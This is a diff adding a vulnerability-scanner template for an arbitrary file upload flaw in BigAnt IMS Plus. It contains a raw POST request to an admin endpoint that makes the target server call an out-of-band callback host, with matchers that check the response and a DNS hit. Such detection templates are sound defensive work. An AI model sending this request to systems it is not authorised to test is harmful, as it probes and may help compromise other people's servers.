@@ -1,0 +1,26 @@
+id: bigant-arbitrary-file-upload
+info:
+  name: BigAnt IMS Plus Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: arbitrary-upload
+http:
+  - raw:
+      - |
+        POST /?m=Admin&c=Plus&a=plus_get_favicon HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        plus_uri=http://{{interactsh-url}}&app_id=pc_client
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"status":0'
+          - '"err_code":3002'
+          - 'not found the $match'
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
